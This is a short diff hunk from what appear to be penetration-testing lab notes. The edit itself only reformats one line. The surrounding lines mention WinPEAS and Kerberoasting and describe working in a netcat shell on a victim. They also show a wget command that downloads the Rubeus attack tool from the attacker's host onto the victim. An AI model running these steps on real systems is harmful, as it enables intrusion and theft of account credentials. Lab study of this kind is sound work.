@@ -615,7 +615,7 @@ WinPEAS identifies misconfigurations for privilege escalation.
 
 Kerberoasting extracts service account hashes via Kerberos and cracks them offline.
 
-- In the netcat shell, execute the powershell command to launch PowerShell. Navigate to C:\Users\Public\Downloads and execute the command cd ../.. ; cd Users\Public\Downloads
+- In the netcat shell, execute the powershell command to launch PowerShell. Navigate to C:\Users\Public\Downloads and execute the command
   - `cd ../.. ; cd Users\Public\Downloads`
 - On victim:
   - wget http://10.10.1.13:8000/Rubeus.exe -o rubeus.exe
